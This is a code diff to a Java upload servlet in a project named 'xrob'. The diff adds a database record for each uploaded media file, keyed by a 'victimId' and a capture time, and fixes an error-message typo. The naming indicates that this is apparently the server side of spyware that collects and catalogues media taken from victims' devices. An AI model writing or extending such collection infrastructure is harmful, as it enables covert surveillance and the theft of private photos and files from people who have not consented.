@@ -4,6 +4,7 @@ import com.theah64.xrob.api.database.tables.Deliveries;
 import com.theah64.xrob.api.database.tables.Servers;
 import com.theah64.xrob.api.database.tables.Media;
 import com.theah64.xrob.api.models.Delivery;
+import com.theah64.xrob.api.models.MediaNode;
 import com.theah64.xrob.api.models.Server;
 import com.theah64.xrob.api.utils.APIResponse;
 import com.theah64.xrob.api.utils.FilePart;
@@ -122,10 +123,15 @@ public class UploadServlet extends AdvancedBaseServlet {
 
 
                 if (downloadLink != null) {
+
+                    final int fileSizeInKb = (int) (dataFilePart.getSize() / 1024);
+                    final long capturedAt = getLongParameter(Media.COLUMN_CAPTURED_AT);
+                    Media.getInstance().add(new MediaNode   (victimId, filePart.getRealFileName(), dataType, server.getId(), downloadLink, fileSizeInKb, capturedAt));
+
                     //File hosted
                     getWriter().write(new APIResponse("File added", "download_link", downloadLink).getResponse());
                 } else {
-                    getWriter().write(new APIResponse("Fa   iled to add file").getResponse());
+                    getWriter().write(new APIResponse("Failed to add file").getResponse());
                 }
 
                 //What ever the data_type, adding delivery;
